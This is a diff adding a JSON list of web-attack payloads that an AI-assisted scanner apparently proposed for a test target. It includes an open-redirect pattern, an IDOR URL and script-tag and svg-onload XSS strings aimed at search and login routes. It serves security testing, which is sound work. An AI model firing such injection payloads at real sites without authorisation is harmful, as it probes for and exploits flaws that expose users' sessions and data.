@@ -1,0 +1,52 @@
+[
+  {
+    "confidence": 0.9,
+    "family": "OPEN_REDIRECT",
+    "parameter": "to",
+    "payload_id": "pat-006446481c3f79b1",
+    "payload_value": "?returnTo={payload}",
+    "rationale_digest": "16d3266a15bb8c1a",
+    "route": "/redirect?to=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "IDOR",
+    "parameter": "path_segment_3",
+    "payload_id": "pat-988f7ff8a922a090",
+    "payload_value": "https://example.com/profile?user_id=124",
+    "rationale_digest": "75018978435306a7",
+    "route": "/rest/basket/1",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.0,
+    "family": "XSS",
+    "parameter": "q",
+    "payload_id": "pat-1609acdda8c3c043",
+    "payload_value": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "rationale_digest": "52fd5820e29fdd08",
+    "route": "/rest/products/search?q=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.85,
+    "family": "XSS",
+    "parameter": "q",
+    "payload_id": "pat-159d2aecac4fbe1e",
+    "payload_value": "<svg/onload=alert('XSS')>",
+    "rationale_digest": "9a25e998532165e2",
+    "route": "/search?q=",
+    "source": "llm_advisory"
+  },
+  {
+    "confidence": 0.65,
+    "family": "XSS",
+    "parameter": "email",
+    "payload_id": "pat-1609acdda8c3c043",
+    "payload_value": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "rationale_digest": "b8f4c353d5f4b3fd",
+    "route": "/rest/user/login",
+    "source": "llm_advisory"
+  }
+]
